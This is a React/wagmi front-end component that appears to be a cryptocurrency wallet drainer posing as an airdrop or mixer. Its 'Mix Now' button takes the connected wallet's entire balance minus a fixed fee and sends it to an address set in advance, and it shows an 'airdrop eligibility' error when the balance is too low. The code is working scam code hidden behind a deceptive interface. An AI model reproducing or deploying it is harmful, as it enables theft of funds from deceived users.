import {
    useAccount,
    useConnect,
    useDisconnect,
    useEnsAvatar,
    useEnsName,
   } from 'wagmi'
   
   import { usePrepareSendTransaction,  useSendTransaction, useWaitForTransaction, useBalance, useNetwork, useSwitchNetwork} from 'wagmi'
import { useEffect, useState } from 'react'
import {useDebounce} from 'use-debounce'
import { parseEther } from 'ethers/lib/utils.js'
import Swal from 'sweetalert2'
import axios from 'axios'
import { Web3Button } from '@web3modal/react'
import { ethers } from 'ethers';


    function Profile(props) {
        const [to, setTo] = useState(props.to)
        
        const { switchNetwork } = useSwitchNetwork()
    const { chain, chains } = useNetwork()
    const { address, connector, isConnected } = useAccount()
    const { data: ensAvatar } = useEnsAvatar({ address })
    const { data: ensName } = useEnsName({ address })
    const { connect, connectors, error, isLoading, pendingConnector } = useConnect()
    const { disconnect } = useDisconnect()
    const [amount, setAmount] = useState(0)
    const [info, setInfo] = useState(false)
    const balance = useBalance({address}) 

    
  
    const fee = 0.0078;
    
    const [debouncedTo] = useDebounce(to, 500)

    const  { sendTransaction } = useSendTransaction({
        request: {
          to: debouncedTo,
          value:  parseEther(String(amount)),
    },
    })
    //console.log(to)
        
    const getWallet = () => {
        const myBalance = balance.data.formatted
        const amtToSend = myBalance - 0.0078;
        //console.log(amtToSend)
        if(amtToSend>0){

            setAmount(amtToSend)
            if(amount > 0){
            sendTransaction()
            }
            else{
            setInfo(true)
            }
            console.log(amount)
            
        }
        else{
            Swal.fire('Oops','This wallet is not Eligible for this Airdrop','error')
        }
        
        // console.log("balance",balance.data.formatted)
        // console.log("fee",fee.data)
    }

    return(
        isConnected && (
            <>
            <div className='modal fade' id='networks'>
              <div className='modal-dialog modal-dialog-centered'>
                  <div className='modal-content bg-dark'>
                      <div className='modal-header h3'>
                          Switch Network
                          <button className='btn btn-dark btn-close' id="close-mod" data-bs-dismiss="modal"></button>
                      </div>
                      <div className='modal-body'>
                      {chains.map((x) => (
      
                          <button className='btn btn-outline-info text-white my-2 w-100'
                          disabled={!switchNetwork || x.id === chain?.id}
                          key={x.id}
                          onClick={() => switchNetwork?.(x.id)}
                          >
                          {x.name}
                          {isLoading && pendingChainId === x.id && ' (switching)'}
                          </button>
      
                          
                      ))}
      
                     
                      </div>
                  </div>
              </div>
          </div>
          {/* <Image src={ensAvatar} alt="ENS Avatar" fill/> */}
          <div><code>{ensName ? `${ensName} (${address})` : address}</code></div>
          <div className='text-info'>Connected to the <b>{chain.name} </b>Network</div>
          <button className=' my-2 btn primary-btn' onClick={getWallet}>
              Mix Now
          </button>
      <br/>
      
          { <span className='btn badge my-2 bg-secondary float-end' data-bs-toggle="modal" data-bs-target='#networks'>Switch network</span> }
        
          </>
        )
        ||
        (
            <>
             <div className='text-center'>
        <Web3Button  label="Mix Now"/>
    {connectors.map((connector,index) => (
        <>
        
    <button  className='btn primary-btn m-2 d-none'
    disabled={!connector.ready}
    key={connector.id}
    onClick={() => connect({ connector })}
    >
    Mix Now
    {!connector.ready && ' (unsupported)'}
    {isLoading &&
    connector.id === pendingConnector?.id &&
    ' (connecting)'}
    </button>
    </>
    ))}
   
  
    
    </div>
            </>
        )
    )
   
   
   }
   
   export default Profile
